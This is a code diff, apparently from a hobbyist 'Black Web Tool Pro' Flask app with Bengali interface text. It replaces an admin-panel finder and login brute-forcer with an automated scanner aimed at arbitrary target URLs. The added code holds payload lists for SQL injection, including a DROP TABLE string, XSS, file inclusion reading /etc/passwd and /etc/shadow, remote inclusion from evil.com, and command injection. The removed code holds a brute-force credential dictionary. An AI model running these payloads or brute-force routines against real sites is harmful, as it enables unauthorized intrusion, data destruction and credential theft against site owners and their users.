@@ -1,6 +1,7 @@
 from flask import Flask, render_template_string, request
 import requests
-import itertools
+from concurrent.futures import ThreadPoolExecutor
+import time
 
 app = Flask(__name__)
 
@@ -8,116 +9,200 @@ HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Admin Finder & Brute</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <title>🖤 Black Web Tool Pro</title>
     <style>
         body{background:#0a0e17;color:#00ffcc;font-family:monospace;padding:20px}
-        .box{max-width:800px;margin:auto;background:#111927;padding:25px;border-radius:15px}
-        input,button{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #00ffcc33;background:#1a2332;color:#00ffcc}
-        button{background:#00ffcc22;cursor:pointer}
-        .result{background:#0d1520;padding:15px;border-radius:8px;white-space:pre-wrap;color:#b0ffdd;margin-top:15px;max-height:400px;overflow:auto}
-        h1{text-align:center;color:#00ffcc}
+        .box{max-width:950px;margin:auto;background:#111927;padding:25px;border-radius:15px;border:1px solid #00ffcc33}
+        h1{text-align:center;color:#ff0044;text-shadow:0 0 20px #ff004488}
+        .sub{text-align:center;color:#886688;font-size:14px}
+        input,button{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:1px solid #334466;background:#0b111e;color:#c0d4ff}
+        button{background:#ff004422;border-color:#ff0044;cursor:pointer;font-weight:bold}
+        button:hover{background:#ff004466}
+        .result{background:#0d1520;padding:15px;border-radius:8px;white-space:pre-wrap;color:#ffccbb;max-height:500px;overflow:auto;margin-top:10px}
+        .badge{color:#ff0044;font-weight:bold}
+        .row{display:flex;gap:10px;flex-wrap:wrap}
+        .row input{flex:1}
+        .row button{flex:0 0 auto;width:auto;padding:12px 25px}
     </style>
 </head>
 <body>
 <div class="box">
-    <h1>🛡️ Admin Finder + Brute</h1>
-    <h3>🔍 অ্যাডমিন প্যানেল খুঁজুন</h3>
-    <form method="POST" action="/find">
-        <input type="text" name="url" placeholder="http://target.com" required>
-        <button type="submit">Scan</button>
-    </form>
-    <h3>🔑 ব্রুটফোর্স অ্যাটাক</h3>
-    <form method="POST" action="/attack">
-        <input type="text" name="login_url" placeholder="http://target.com/admin/login" required>
-        <input type="text" name="user_field" placeholder="ইউজারনেম ফিল্ড (খালি রাখলে শুধু পাস চেক করবে)" value="">
-        <input type="text" name="pass_field" placeholder="পাসওয়ার্ড ফিল্ড" value="password">
-        <button type="submit">Attack</button>
+    <h1>🖤 Black Web Tool Pro</h1>
+    <div class="sub">Developer Arif • v3.0 • <span class="badge">#HardMode</span></div>
+    <form method="POST" action="/scan">
+        <div class="row">
+            <input type="text" name="url" placeholder="http://target.com" required>
+            <input type="text" name="param" placeholder="প্যারামিটার (যেমন: id, q)" value="id">
+            <button type="submit">🚀 Scan</button>
+        </div>
     </form>
     {% if result %}
-    <div class="result">{{ result }}</div>
+    <div class="result">{{ result|safe }}</div>
     {% endif %}
 </div>
 </body>
 </html>
 """
 
-def find_admin(url):
-    paths = ['/admin','/admin.php','/login','/wp-admin','/administrator','/panel','/dashboard','/admincp','/cpanel','/user','/auth','/backend','/admin_area']
-    found=[]
-    if not url.startswith(('http://','https://')):
-        url='http://'+url
-    for p in paths:
+# ===== অ্যাডমিন প্যানেল লিস্ট =====
+admin_paths = [
+    '/admin','/admin.php','/login','/wp-admin','/administrator',
+    '/panel','/dashboard','/admincp','/cpanel','/user','/auth',
+    '/backend','/admin_area','/controlpanel','/manage','/siteadmin',
+    '/master','/console','/setup','/install','/config','/sql',
+    '/phpmyadmin','/mysql','/db','/logs','/backup','/old','/test'
+]
+
+# ===== SQLi পেলোড =====
+sqli_payloads = [
+    "'", "\"", "' OR '1'='1", "' OR '1'='1' --", "\" OR \"1\"=\"1",
+    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
+    "'; DROP TABLE users--", "' AND 1=1--", "' AND 1=2--"
+]
+
+# ===== XSS পেলোড =====
+xss_payloads = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "\"><script>alert(1)</script>",
+    "<svg/onload=alert(1)>",
+    "javascript:alert(1)"
+]
+
+# ===== LFI পেলোড =====
+lfi_payloads = [
+    "../../../../etc/passwd",
+    "../../../../etc/shadow",
+    "../../../../windows/win.ini",
+    "../../../../boot.ini",
+    "/etc/passwd"
+]
+
+# ===== RFI পেলোড =====
+rfi_payloads = [
+    "http://evil.com/shell.txt",
+    "https://pastebin.com/raw/xxxx"
+]
+
+# ===== কমান্ড ইনজেকশন =====
+cmd_payloads = [
+    "; ls", "| whoami", "&& id", "| dir", "; cat /etc/passwd"
+]
+
+def scan_admin(url):
+    found = []
+    for p in admin_paths:
         try:
-            r=requests.get(url.rstrip('/')+p, timeout=2)
+            r = requests.get(url.rstrip('/')+p, timeout=2, allow_redirects=False)
             if r.status_code in [200,301,302,401,403]:
-                found.append(f"✅ {url.rstrip('/')+p}  → {r.status_code}")
+                found.append(f"✅ অ্যাডমিন: {url.rstrip('/')+p} → {r.status_code}")
         except:
-            found.append(f"⚠️ {p} → error")
-    return "\n".join(found) if found else "❌ কিছু পাওয়া যায়নি"
+            pass
+    return found
 
-def brute_force(login_url, user_field, pass_field):
-    if not login_url.startswith(('http://','https://')):
-        login_url='http://'+login_url
+def scan_sqli(url, param):
+    found = []
+    for payload in sqli_payloads:
+        try:
+            test_url = f"{url}?{param}={payload}"
+            r = requests.get(test_url, timeout=2)
+            if any(x in r.text.lower() for x in ['mysql','sql','syntax','error','warning','ora-']):
+                found.append(f"⚠️ SQLi: {test_url}")
+                break
+        except:
+            pass
+    return found
 
-    # ডিফল্ট ডিকশনারি
-    passwords = ['admin','arif123','123456','password','12345','root','qwerty','abc123','111111','letmein','pass123','welcome','admin123','password123','123456789']
-    usernames = ['admin','root','user','test','guest','manager','demo','superadmin','webmaster','sysadmin','admin123','admin12',]
+def scan_xss(url, param):
+    found = []
+    for payload in xss_payloads:
+        try:
+            test_url = f"{url}?{param}={payload}"
+            r = requests.get(test_url, timeout=2)
+            if payload in r.text:
+                found.append(f"⚠️ XSS: {test_url}")
+                break
+        except:
+            pass
+    return found
 
-    # ডুপ্লিকেট রিমুভ
-    usernames = list(set(usernames))
-    passwords = list(set(passwords))
+def scan_lfi(url, param):
+    found = []
+    for payload in lfi_payloads:
+        try:
+            test_url = f"{url}?{param}={payload}"
+            r = requests.get(test_url, timeout=2)
+            if any(x in r.text.lower() for x in ['root:','admin:','[boot loader]','[fonts]']):
+                found.append(f"⚠️ LFI: {test_url}")
+                break
+        except:
+            pass
+    return found
 
-    found = None
+def scan_rfi(url, param):
+    found = []
+    for payload in rfi_payloads:
+        try:
+            test_url = f"{url}?{param}={payload}"
+            r = requests.get(test_url, timeout=2)
+            if 'shell' in r.text.lower() or 'evil' in r.text.lower():
+                found.append(f"⚠️ RFI: {test_url}")
+                break
+        except:
+            pass
+    return found
 
-    # ইউজারনেম ফিল্ড খালি থাকলে শুধু পাস ট্রাই
-    if not user_field.strip():
-        for p in passwords:
-            try:
-                data = {pass_field: p}
-                r = requests.post(login_url, data=data, timeout=2, allow_redirects=False)
-                if r.status_code == 302 or (r.status_code==200 and any(w in r.text.lower() for w in ['dashboard','welcome','panel'])):
-                    found = f"🎯 সফল! পাস: {p}"
-                    break
-            except:
-                continue
-    else:
-        for u,p in itertools.product(usernames, passwords):
-            try:
-                data = {user_field: u, pass_field: p}
-                r = requests.post(login_url, data=data, timeout=2, allow_redirects=False)
-                if r.status_code == 302 or (r.status_code==200 and any(w in r.text.lower() for w in ['dashboard','welcome','panel'])):
-                    found = f"🎯 সফল! ইউজার: {u} | পাস: {p}"
-                    break
-            except:
-                continue
-
-    if found:
-        return found
-    else:
-        return "❌ কোনো ক্রেডেনশিয়াল কাজ করেনি।"
+def scan_cmd(url, param):
+    found = []
+    for payload in cmd_payloads:
+        try:
+            test_url = f"{url}?{param}={payload}"
+            r = requests.get(test_url, timeout=2)
+            if any(x in r.text.lower() for x in ['uid=','root','admin','user','nt authority']):
+                found.append(f"⚠️ CMD Inj: {test_url}")
+                break
+        except:
+            pass
+    return found
 
 @app.route('/', methods=['GET'])
 def index():
     return render_template_string(HTML, result=None)
 
-@app.route('/find', methods=['POST'])
-def find():
+@app.route('/scan', methods=['POST'])
+def scan():
     url = request.form.get('url','').strip()
+    param = request.form.get('param','id').strip()
     if not url:
-        return render_template_string(HTML, result="URL দিন")
-    res = find_admin(url)
-    return render_template_string(HTML, result=res)
+        return render_template_string(HTML, result="❌ URL দিন")
+    if not url.startswith(('http://','https://')):
+        url = 'http://' + url
 
-@app.route('/attack', methods=['POST'])
-def attack():
-    login_url = request.form.get('login_url','').strip()
-    user_field = request.form.get('user_field','').strip()
-    pass_field = request.form.get('pass_field','password').strip()
-    if not login_url:
-        return render_template_string(HTML, result="লগইন URL দিন")
-    res = brute_force(login_url, user_field, pass_field)
-    return render_template_string(HTML, result=res)
+    result_lines = []
+    result_lines.append("🖤 স্ক্যান শুরু...\n")
+
+    result_lines.append("\n[+] অ্যাডমিন প্যানেল...")
+    result_lines.extend(scan_admin(url))
+
+    if param:
+        result_lines.append("\n[+] SQLi স্ক্যান...")
+        result_lines.extend(scan_sqli(url, param))
+
+        result_lines.append("\n[+] XSS স্ক্যান...")
+        result_lines.extend(scan_xss(url, param))
+
+        result_lines.append("\n[+] LFI স্ক্যান...")
+        result_lines.extend(scan_lfi(url, param))
+
+        result_lines.append("\n[+] RFI স্ক্যান...")
+        result_lines.extend(scan_rfi(url, param))
+
+        result_lines.append("\n[+] কমান্ড ইনজেকশন...")
+        result_lines.extend(scan_cmd(url, param))
+
+    result_lines.append("\n[✔] স্ক্যান সম্পূর্ণ।")
+    return render_template_string(HTML, result="\n".join(result_lines))
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
